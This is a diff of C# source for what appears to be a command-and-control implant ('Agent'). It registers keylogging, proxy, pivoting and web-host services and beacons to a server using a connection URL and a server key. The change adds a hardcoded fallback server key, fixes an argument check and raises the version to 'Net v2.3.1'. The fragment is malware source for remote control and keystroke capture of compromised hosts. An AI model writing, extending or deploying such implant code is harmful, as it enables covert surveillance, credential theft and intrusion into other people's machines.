@@ -46,9 +46,13 @@ namespace Agent
                 connUrl = _args[0];
             }
 
-            if (_args.Count() > 0)
+            if (_args.Count() > 1)
             {
                 serverKey = _args[1];
+            }
+            else
+            {
+                serverKey = "1yOdEVXef7ljnzrRgINB27Bi4zGwi1v2B664b65hAO7elTTM";
             }
 #endif
             var connexion = ConnexionUrl.FromString(connUrl);
@@ -68,11 +72,12 @@ namespace Agent
 
             ServiceProvider.RegisterSingleton<IMessageService>(new MessageService(metaData));
             ServiceProvider.RegisterSingleton<IFileService>(new FileService());
+            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
 
             ServiceProvider.RegisterSingleton<IProxyService>(new ProxyService());
             ServiceProvider.RegisterSingleton<IPivotService>(new PivotService());
             ServiceProvider.RegisterSingleton<IKeyLogService>(new KeyLogService());
-            ServiceProvider.RegisterSingleton<IWebHostService>(new WebHostService());
+            
 
 
             var commModule = CommunicationFactory.CreateCommunicator(connexion, serverKey);
@@ -117,7 +122,7 @@ namespace Agent
                 Architecture = IntPtr.Size == 8 ? "x64" : "x86",
                 Integrity = integrity,
                 EndPoint = endpoint,
-                Version = "Net v2.2",
+                Version = "Net v2.3.1",
                 SleepInterval = endpoint.ToLower().StartsWith("http") ? 2 : 0, //pivoting agent
                 SleepJitter = 0
             };
